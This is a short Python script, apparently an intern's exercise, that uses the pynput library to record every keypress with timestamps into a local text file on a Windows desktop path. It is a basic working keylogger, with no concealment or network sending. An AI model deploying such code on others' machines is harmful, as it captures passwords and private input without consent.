from pynput import keyboard
import logging
log_dir = r"C:\Users\ashwi\Desktop\Intern"
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {0}'.format(key))
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
